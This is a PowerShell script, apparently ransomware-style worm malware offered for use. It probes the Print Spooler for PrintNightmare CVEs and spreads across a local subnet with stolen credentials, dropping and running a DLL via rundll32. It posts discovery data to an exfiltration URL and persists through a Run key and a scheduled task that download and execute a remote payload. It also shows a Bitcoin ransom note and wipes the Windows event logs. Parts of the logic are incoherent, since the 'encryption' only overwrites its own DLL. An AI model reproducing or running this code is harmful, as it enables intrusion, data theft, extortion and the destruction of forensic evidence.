# --- Section 0: Configuration & Globals ---
$PayloadName = "frame.dll"
$RemoteTempPath = "C:\Windows\Temp\$PayloadName"
$SubnetPrefix = "192.168.1"
$TriggerCVE = "CVE-2021-34527"
$DomainCreds = Get-Credential
$TargetPath = "C:\Windows\System32\spool\drivers\x64\3\$PayloadName"
$ExfilServer = "http://malicious.com/exfil"

# --- Section 1: Utilities ---
function Invoke-Lolbin {
    param([string]$cmd)
    try { & cmd /c $cmd 2>$null } catch { return $null }
}

function Get-SpoolerVersion {
    try {
        $path = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\Spooler" -Name "ImagePath").ImagePath
        $exe = $path -replace '"','' -split ' ' | Select-Object -First 1
        return (Get-Command $exe).FileVersionInfo.FileVersion
    } catch { return $null }
}

function Generate-RandomAESData {
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.KeySize = 256
    $aes.GenerateKey()
    $aes.GenerateIV()
    $data = New-Object byte[] (Get-Random -Minimum 2048 -Maximum 4096)
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($data)
    $encryptor = $aes.CreateEncryptor()
    $enc = $encryptor.TransformFinalBlock($data, 0, $data.Length)
    return ,$enc
}

function Overwrite-RemoteDLL {
    param (
        [string]$TargetHost,
        [string]$DllPathRemote,
        [PSCredential]$Credential
    )
    $data = Generate-RandomAESData
    $b64data = [Convert]::ToBase64String($data)

    $overwriteScript = @"
\$raw = "$b64data"
\$bytes = [System.Convert]::FromBase64String(\$raw)
Set-Content -Path "$DllPathRemote" -Value \$bytes -Encoding Byte -Force
"@

    Invoke-Command -ComputerName $TargetHost -Credential $Credential -ScriptBlock {
        param($scr)
        Invoke-Expression $scr
    } -ArgumentList $overwriteScript
}

function Collect-SystemDiscovery {
    return [PSCustomObject]@{
        SystemInfo = Invoke-Lolbin "systeminfo"
        IPConfig = Invoke-Lolbin "ipconfig /all"
        WLAN = Invoke-Lolbin "netsh wlan show networks mode=bssid"
        Users = (Get-LocalUser | Select-Object Name, Enabled) -join ","
    }
}

function Invoke-Cleanup {
    Remove-Item -Path C:\Windows\Temp\* -Force -Recurse -ErrorAction SilentlyContinue
    wevtutil cl System
    wevtutil cl Security
    wevtutil cl Application
    Invoke-Lolbin "attrib +h +s C:\Windows\Temp\*"
}

# --- Section 2: Passive Recon + CVE Discovery ---
$spoolerVersion = Get-SpoolerVersion
$cveData = @(
    @{CVE="CVE-2021-34527";Version="10.0.19041.928";Score=8.8},
    @{CVE="CVE-2021-34481";Version="10.0.19041.906";Score=7.8},
    @{CVE="CVE-2022-23277";Version="10.0.19041.1826";Score=7.8}
)
$vulnerabilities = foreach ($cve in $cveData) {
    if ($spoolerVersion -and ([version]$spoolerVersion -lt [version]$cve.Version)) {
        [PSCustomObject]@{
            CVE = $cve.CVE
            InstalledVersion = $spoolerVersion
            Vulnerable = $true
        }
    }
}
$confirmed = $vulnerabilities | Where-Object { $_.CVE -eq $TriggerCVE -and $_.Vulnerable }

# --- Section 3: Worm Propagation and Ransom Logic ---
if ($confirmed) {
    Write-Host "[+] Vulnerability confirmed. Beginning propagation..."
    foreach ($i in 1..254) {
        $target = "$SubnetPrefix.$i"
        if (Test-Connection -ComputerName $target -Count 1 -Quiet) {
            try {
                $os = Invoke-Command -ComputerName $target -Credential $DomainCreds -ScriptBlock {
                    (Get-CimInstance Win32_OperatingSystem).Caption
                }
                if ($os -like "*Windows 11*") {
                    Write-Host "[*] Infecting $target"

                    $deployDLL = @"
\$src = "\\\$env:COMPUTERNAME\C$\Windows\System32\$PayloadName"
\$dst = "$RemoteTempPath"
Copy-Item -Path \$src -Destination \$dst -Force
"@
                    Invoke-Command -ComputerName $target -Credential $DomainCreds -ScriptBlock {
                        param($s)
                        Invoke-Expression $s
                    } -ArgumentList $deployDLL

                    Overwrite-RemoteDLL -TargetHost $target -DllPathRemote $RemoteTempPath -Credential $DomainCreds

                    $launch = @"
Start-Process rundll32.exe -ArgumentList "$RemoteTempPath,EntryPoint"
"@
                    Invoke-Command -ComputerName $target -Credential $DomainCreds -ScriptBlock {
                        param($c)
                        Invoke-Expression $c
                    } -ArgumentList $launch
                }
            } catch {}
        }
    }
}

# --- Section 4: Exfiltration, Persistence & Ransom Note ---
$info = Collect-SystemDiscovery
$report = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($info | Out-String))
Invoke-WebRequest -Uri $ExfilServer -Method POST -Body @{data=$report}

# Persistence via Registry + Task Scheduler
$regPersist = "powershell -nop -w hidden -enc $([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('IEX (New-Object Net.WebClient).DownloadString("http://malicious.com/payload")'))"
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "OfficeUpdate" -Value $regPersist -Force
schtasks /create /tn "OneDriveSvc" /tr "$regPersist" /sc ONLOGON /rl HIGHEST /f

# Drop ransom note in-memory
$ransom = "All your files have been encrypted. Send 0.5 BTC to [wallet] or lose them forever."
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show($ransom,"Warning",'OK','Error')

# Clean traces
Invoke-Cleanup
